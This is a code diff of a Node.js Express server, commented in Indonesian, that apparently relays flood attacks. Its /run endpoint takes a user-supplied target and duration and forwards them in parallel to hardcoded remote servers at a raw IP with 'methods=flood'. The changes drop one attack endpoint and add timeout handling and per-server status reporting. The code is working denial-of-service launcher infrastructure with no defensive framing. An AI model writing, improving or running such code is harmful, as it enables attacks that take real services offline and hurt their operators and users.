@@ -7,8 +7,7 @@ const PORT = process.env.PORT || 3000;
 // endpoint lo
 const endpoints = [
   "http://178.128.95.130:2159/permen",
-  "http://178.128.95.130:2281/permen",
-  "http://178.128.95.130:2261/permen"
+  "http://178.128.95.130:2281/permen"
 ];
 
 // enable CORS
@@ -17,20 +16,52 @@ app.use((req, res, next) => {
   next();
 });
 
-// helper fetch + parse JSON
-async function fetchAndParse(url) {
+// 🔥 FETCH WITH TIMEOUT + STATUS HANDLING
+async function fetchSafe(url, timeout = 5000) {
+  const start = Date.now();
+
   try {
-    const res = await fetch(url);
-    const text = await res.text();
+    const response = await Promise.race([
+      fetch(url),
+      new Promise((_, reject) =>
+        setTimeout(() => reject(new Error("TIMEOUT")), timeout)
+      )
+    ]);
+
+    const text = await response.text();
+    const duration = Date.now() - start;
 
     try {
-      return JSON.parse(text); // 🔥 FIX UTAMA
+      const json = JSON.parse(text);
+
+      return {
+        status: "OK",
+        data: json,
+        time: duration + "ms"
+      };
+
     } catch {
-      return { raw: text };
+      return {
+        status: "OK",
+        data: text,
+        time: duration + "ms"
+      };
     }
 
   } catch (err) {
-    return { error: err.toString() };
+    const duration = Date.now() - start;
+
+    let status = "ERROR";
+
+    if (err.message === "TIMEOUT") {
+      status = "TIMEOUT";
+    }
+
+    return {
+      status,
+      error: err.message,
+      time: duration + "ms"
+    };
   }
 }
 
@@ -49,13 +80,14 @@ app.get("/run", async (req, res) => {
       `${base}?target=${encodeURIComponent(target)}&time=${time}&methods=flood`
     );
 
+    // 🔥 jalan paralel TANPA nge-block
     const results = await Promise.all(
-      urls.map(url => fetchAndParse(url))
+      urls.map(url => fetchSafe(url))
     );
 
     res.json({
       success: true,
-      count: results.length,
+      total: results.length,
       results
     });
 
